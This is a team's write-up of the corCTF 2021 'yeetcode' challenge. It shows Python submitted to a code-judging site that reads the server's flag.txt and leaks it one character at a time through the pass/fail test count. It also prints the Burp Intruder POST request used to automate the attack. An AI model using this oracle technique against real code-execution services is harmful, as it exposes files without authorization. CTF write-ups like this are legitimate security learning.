# corCTF 2021

Written by [Balberg Flagg & Service AS](https://ctftime.org/team/152116)
<br>
<br>
![corCTF](https://raw.githubusercontent.com/bf-s/CTF-Writeups/main/corCTF-2021/res/disc_crusader.jpg)

---
## misc/yeetcode
### Task
Brush up on your coding skills and ace your next interview with YeetCode! Flag is at ./flag.txt <br>
[https://yeetcode.be.ax](https://yeetcode.be.ax)

When you go to the website you're met with this task:

> Here's a test of your basic operations.This revolutionary problem will change your thinking forever. Given two integers a and b, create a function f(a, b) so that it sums them. For example, f(2, 3) should return 5, and f(5, 7) should return 12. Write your code in the box below:

The site is in [yeetcode](https://github.com/bf-s/CTF-Writeups/main/corCTF-2021/yeetcode/) 

### Writeup
A note before we begin the writeup; We didn't realize the task had andy files with it. So it may have been better soloutions if we actually read the code.
<br>
We quicly understood that the programming language used in the textbox was python. We tried to just print somthing at first, but understood that we didnt get any output. <br>
We continued to solve the task given at the top of the site in python and got "You passed 10/10 test cases. Congrats!" as output when we ran this script:
```python
def f(a, b):
    return a+b
f(1,6)
```
We then tried to print somthing in the def f before we returned the sum and got "You passed 0/10 test cases.". After some more testing we saw that as long as we solved the task, or at least had a way of solving the task in a script we got a boolean as a returned value with 10 as output when we ran the code with no print commands and the correced returned value. <br>
We then tried to read the flag in python and return the same value "a+b" with 10/10 tests passed. This made us try to set a if statement in the code with the condition testing the n'th caracter in the flag like this:
```python
def f(a, b):
  with open('flag.txt', 'r') as r:
    c= r.read()
  if c[0] == 'c':
    return a+b
  else:
    print('test')
f(1,6)
```
Scince we knew the first char in the flag is "c" this should return 10/10 passed, and it did. We knew we had the soloution, but had too much to do if we did it manually. We ended up using intruder in burpsuite with this POST request.
```
POST /yeetyeet HTTP/1.1
Host: yeetcode.be.ax
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://yeetcode.be.ax/yeet
Content-Type: text/plain;charset=UTF-8
Origin: https://yeetcode.be.ax
Content-Length: 136
Connection: close

def f(a, b):
  with open('flag.txt', 'r') as r:
    c= r.read()
  if c[0] == '§1§':
    return a+b
  else
    print('test')
f(1,6)
```
Where §1§ is a payload list with the characters abcdefghijklmnopqrstuvwxyz1234567890!#-.,{}()-_ with one char on each line. We manually switched the char we were testing in c after each hit and got the flag at last.
Flag:
```
corctf{1m4g1n3_cp_g0lf_6a318dfe}
```
---

